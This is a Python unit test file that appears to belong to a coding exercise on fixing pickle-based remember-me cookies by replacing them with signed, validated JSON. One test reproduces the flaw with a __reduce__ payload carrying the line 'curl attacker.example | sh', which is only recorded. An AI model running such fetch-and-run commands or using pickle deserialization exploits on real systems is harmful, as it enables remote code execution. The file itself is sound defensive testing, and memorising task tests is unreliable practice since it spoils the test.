import base64
import hashlib
import hmac
import json
import secrets
import unittest

from solution import (
    MAX_COOKIE_LENGTH,
    REMEMBER_ME_TTL_S,
    InvalidCookie,
    RememberMe,
    issue_cookie,
    naive_decode,
    naive_encode,
    read_cookie,
)

# Stands in for the shell commands a real attacker would run. Nothing is executed.
ATTACKER_COMMAND = "curl attacker.example | sh"
EXECUTED_COMMANDS: list[str] = []


def record_execution(command):
    """Harmless stand-in for os.system: just records that code ran during loading."""
    EXECUTED_COMMANDS.append(command)
    return {"user_id": "u-1", "theme": "dark"}


class MaliciousPayload:
    """What an attacker pickles: unpickling calls record_execution(ATTACKER_COMMAND)."""

    def __reduce__(self):
        return (record_execution, (ATTACKER_COMMAND,))


class FakeClock:
    def __init__(self, start=1_700_000_000.0):
        self.now = start

    def __call__(self):
        return self.now

    def advance(self, seconds):
        self.now += seconds


def b64(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def signed_cookie(key, body_bytes):
    """Build a correctly signed cookie around arbitrary bytes (as if our key signed them)."""
    body = b64(body_bytes)
    signature = b64(hmac.new(key, body.encode(), hashlib.sha256).digest())
    return body + "." + signature


def signed_json(key, payload):
    return signed_cookie(key, json.dumps(payload).encode())


class ReproduceProblem(unittest.TestCase):
    def setUp(self):
        EXECUTED_COMMANDS.clear()

    def test_pickled_cookie_round_trips_for_honest_users(self):
        data = {"user_id": "u-1", "theme": "dark"}
        self.assertEqual(naive_decode(naive_encode(data)), data)

    def test_crafted_cookie_runs_attacker_code_while_loading(self):
        cookie = naive_encode(MaliciousPayload())
        naive_decode(cookie)
        self.assertEqual(EXECUTED_COMMANDS, [ATTACKER_COMMAND])


class FixSignedJsonCookie(unittest.TestCase):
    def setUp(self):
        EXECUTED_COMMANDS.clear()
        self.key = secrets.token_bytes(32)
        self.clock = FakeClock()

    def read(self, cookie):
        return read_cookie(self.key, cookie, self.clock)

    def test_honest_cookie_round_trips(self):
        cookie = issue_cookie(self.key, "u-1", "dark", self.clock)
        expected = RememberMe("u-1", "dark", int(self.clock()) + REMEMBER_ME_TTL_S)
        self.assertEqual(self.read(cookie), expected)

    def test_pickle_exploit_is_rejected_without_running_code(self):
        with self.assertRaises(InvalidCookie):
            self.read(naive_encode(MaliciousPayload()))
        self.assertEqual(EXECUTED_COMMANDS, [])

    def test_cookie_signed_with_another_key_is_rejected(self):
        other_key = secrets.token_bytes(32)
        cookie = issue_cookie(other_key, "u-1", "dark", self.clock)
        with self.assertRaises(InvalidCookie):
            self.read(cookie)

    def test_edited_user_id_breaks_the_signature(self):
        cookie = issue_cookie(self.key, "u-1", "dark", self.clock)
        _body, signature = cookie.split(".")
        forged = json.dumps({"user_id": "admin", "theme": "dark", "expires_at": 9_999_999_999})
        with self.assertRaises(InvalidCookie):
            self.read(b64(forged.encode()) + "." + signature)

    def test_extra_field_is_rejected_even_when_signed(self):
        payload = {"user_id": "u-1", "theme": "dark", "expires_at": 1_800_000_000, "role": "admin"}
        with self.assertRaises(InvalidCookie):
            self.read(signed_json(self.key, payload))

    def test_unknown_theme_is_rejected(self):
        payload = {"user_id": "u-1", "theme": "<script>", "expires_at": 1_800_000_000}
        with self.assertRaises(InvalidCookie):
            self.read(signed_json(self.key, payload))

    def test_boolean_expiry_is_rejected(self):
        payload = {"user_id": "u-1", "theme": "dark", "expires_at": True}
        with self.assertRaises(InvalidCookie):
            self.read(signed_json(self.key, payload))

    def test_signed_non_json_is_rejected(self):
        with self.assertRaises(InvalidCookie):
            self.read(signed_cookie(self.key, b"\x80\x04not json"))

    def test_cookie_expires_after_thirty_days(self):
        cookie = issue_cookie(self.key, "u-1", "light", self.clock)
        self.clock.advance(REMEMBER_ME_TTL_S)
        with self.assertRaises(InvalidCookie):
            self.read(cookie)

    def test_oversized_and_malformed_cookies_are_rejected(self):
        for cookie in ["", "no-separator", "a.b.c", "x" * (MAX_COOKIE_LENGTH + 1)]:
            with self.subTest(cookie=cookie[:20]):
                with self.assertRaises(InvalidCookie):
                    self.read(cookie)

    def test_issuing_a_cookie_with_an_invalid_theme_fails(self):
        with self.assertRaises(InvalidCookie):
            issue_cookie(self.key, "u-1", "neon", self.clock)


if __name__ == "__main__":
    unittest.main()
